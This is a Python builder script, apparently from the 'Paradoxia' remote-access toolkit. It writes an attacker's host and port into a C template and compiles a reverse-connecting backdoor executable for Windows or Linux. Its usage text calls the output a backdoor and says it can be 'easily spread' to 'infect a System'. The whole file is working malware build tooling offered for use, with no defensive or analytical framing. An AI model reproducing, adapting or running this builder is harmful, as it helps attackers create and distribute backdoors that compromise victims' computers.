"""

Generate Agent

"""
import os
import subprocess

def create_agent(lhost, lport, mode):
	
	if(len(lhost) > 0 and len(lport) > 0 and len(mode) > 0):
		if(mode == "static"):
			static = True
		else:
			print("[WARNING]: It is recommended you create a static Bot.")
			static = False

		os.chdir("bot")
		with open("clientc.h", "r+") as source_code:
			source = source_code.read()
			replace = source.replace("lhost", lhost)
			final_replace = replace.replace("lport", lport)
			with open("client.h", "w") as final:
				final.write(final_replace)
				
		if(os.name == "nt"):
			if(static == True):
				print("[+] Building Static BOT which will connect on {lhost}:{lport}.".format(lhost=lhost, lport=lport))
				subprocess.call(["make", "windows-static"], stdout=open(os.devnull,"w"), stderr=subprocess.STDOUT)
			else:
				print("[+] Building BOT which will connect on {lhost}:{lport}.".format(lhost=lhost, lport=lport))
				subprocess.call(["make", "windows"], stdout=open(os.devnull,"w"), stderr=subprocess.STDOUT)
		else:
			if(static == True):
				print("[+] Building Static BOT which will connect on {lhost}:{lport}.".format(lhost=lhost, lport=lport))
				subprocess.call(["make", "linux-static"], stdout=open(os.devnull,"w"), stderr=subprocess.STDOUT)
			else:
				print("[+] Building BOT which will connect on {lhost}:{lport}.".format(lhost=lhost, lport=lport))
				subprocess.call(["make", "linux"], stdout=open(os.devnull,"w"), stderr=subprocess.STDOUT)

		os.chdir("..")
		try:
			file = "bot/Paradoxia.exe"
			#os.remove("bot/Paradoxia.h")
			with open(file, "rb") as backdoor:
				hello = os.stat(file)
				print("\n-> Paradoxia.exe | Size : {size} bytes | Path : {path}"
					.format(size=str(hello.st_size), path=os.path.dirname(os.path.abspath(file))))
		except FileNotFoundError:
			print("-> Failed to create Backdoor.")
		except Exception as es:
			print("-> Error : " +str(es))

	else:
		print("""
		[X] USAGE : build lhost=<lhost> lport=<lport> <static>/<normal>

		LHOST - Ipv4 Address of Server to Connect to.
		LPORT - Port of Server to Connect to.
		static - Standalone Executable to run on almost any System.
		normal - Executable that requires libraries to run.

		EXAMPLES : 
		[+] build lhost=192.168.0.101 lport=443 static
		|- Size : Around 2.1 MB.
		|- This will generate an Executable that you can easily spread 
			without worrying that it will work or not.

		[+] build lhost=192.168.0.101 lport=443 normal
		|- Size : Around 600 kb.
		|- This will generate an Executable that you can use for tests
			on your own PC. Or infect a System which an environment where
			it can run.

		""")